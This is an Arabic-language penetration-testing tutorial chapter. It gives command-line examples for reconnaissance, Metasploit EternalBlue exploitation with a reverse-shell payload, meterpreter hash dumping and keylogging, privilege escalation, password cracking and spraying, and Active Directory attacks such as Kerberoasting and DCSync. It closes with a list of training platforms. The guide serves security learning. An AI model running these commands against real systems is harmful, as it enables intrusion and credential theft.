# 05 — الاختراق الأخلاقي (Ethical Hacking / Penetration Testing)

---

## منهجية اختبار الاختراق

```
1. Reconnaissance (الاستطلاع)
2. Scanning & Enumeration (المسح والتعداد)
3. Gaining Access (الوصول)
4. Maintaining Access (الاستمرار)
5. Covering Tracks (إخفاء الأثر)
6. Reporting (التقرير)
```

---

## المرحلة 1: Reconnaissance

### Passive Recon (بدون لمس الهدف)

```bash
# OSINT — جمع المعلومات من المصادر المفتوحة
theHarvester -d target.com -b all      # Emails, subdomains
shodan search "hostname:target.com"    # Devices on internet
maltego                                 # رسم العلاقات بصريًا
recon-ng                                # Framework متكامل

# Google Dorks
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com ext:sql OR ext:env
"target.com" "password"

# DNS Enumeration
dnsx -d target.com -a -cname           # Active DNS
subfinder -d target.com                # Subdomain discovery
amass enum -d target.com               # الأشمل
```

### Active Recon

```bash
# Nmap — أساس الـ Scanning
nmap -sC -sV -oA scan target.com       # الفحص الأساسي
nmap -p- target.com                    # فحص كل المنافذ
nmap -sU target.com                    # UDP scan
nmap --script vuln target.com          # فحص الثغرات

# Web Application Recon
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -w wordlist.txt -u http://target.com/FUZZ
nikto -h http://target.com             # فحص سريع للثغرات
whatweb http://target.com              # تحديد التقنيات
```

---

## المرحلة 2-3: Exploitation

### Metasploit Framework

```bash
msfconsole

# البحث عن exploit
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue

# الإعداد
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

run
```

### Post-Exploitation (ما بعد الوصول)

```bash
# داخل Meterpreter
getuid                 # من أنت؟
getsystem              # محاولة الحصول على SYSTEM
hashdump               # سحب كلمات المرور
screenshot             # لقطة شاشة
keyscan_start          # Keylogger
run post/multi/recon/local_exploit_suggester  # اقتراح Privesc

# Pivoting
route add 10.10.10.0/24 SESSION_ID  # الوصول لشبكات داخلية
portfwd add -l 3389 -p 3389 -r TARGET  # Port Forwarding
```

---

## Privilege Escalation

### Linux PrivEsc

```bash
# أدوات أوتوماتيكية
./linpeas.sh           # الأشمل
./linux-exploit-suggester.sh

# يدوي
find / -perm -4000 2>/dev/null     # SUID files
sudo -l                             # ماذا يمكنني تشغيل بـ sudo؟
crontab -l && cat /etc/crontab      # Cron jobs
cat /etc/passwd                     # هل هناك كلمات مرور؟
env                                 # متغيرات البيئة
```

### Windows PrivEsc

```powershell
# أدوات أوتوماتيكية
.\winPEAS.exe
.\PowerUp.ps1; Invoke-AllChecks

# يدوي
whoami /priv                    # Privileges الخاصة بك
sc qc SERVICE_NAME              # إعدادات الخدمات
accesschk.exe -uwcqv "Users" * # خدمات يمكن للمستخدم العادي تعديلها
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## Password Attacks

```bash
# Hashcat
hashcat -m 0 hash.txt rockyou.txt          # MD5
hashcat -m 1000 hash.txt rockyou.txt       # NTLM
hashcat -m 1800 hash.txt rockyou.txt       # sha512crypt

# John the Ripper
john --wordlist=rockyou.txt hash.txt
john --rules hash.txt                       # مع قواعد التحويل

# Hydra (Online brute force)
hydra -l admin -P rockyou.txt ssh://target
hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# CrackMapExec
cme smb 192.168.1.0/24 -u users.txt -p passwords.txt  # Password Spraying
```

---

## Active Directory Attacks

```bash
# Enumeration
bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c all
ldapdomaindump -u 'DOMAIN\user' -p 'pass' DC_IP

# Kerberoasting
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request

# AS-REP Roasting
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP

# Pass-the-Hash
impacket-psexec DOMAIN/admin@TARGET -hashes :NTLM_HASH

# DCSync
impacket-secretsdump DOMAIN/admin:pass@DC_IP
```

---

## ⏱️ الوقت المقدر: 3-6 أشهر (مستمر)

## منصات التدريب العملي

| المنصة | المستوى | التكلفة |
|--------|---------|---------|
| [TryHackMe](https://tryhackme.com) | مبتدئ → متوسط | مجاني / مدفوع |
| [HackTheBox](https://hackthebox.com) | متوسط → متقدم | مجاني / مدفوع |
| [PentesterLab](https://pentesterlab.com) | ويب متخصص | مجاني جزئيًا |
| [VulnHub](https://vulnhub.com) | متنوع | مجاني |
| [TCM Security Academy](https://academy.tcm-sec.com) | شامل | مدفوع |

## مصادر
- كتاب: *The Web Application Hacker's Handbook*
- كتاب: *Penetration Testing* - Georgia Weidman
- [PNPT Certification - TCM Security](https://certifications.tcm-sec.com/pnpt/)
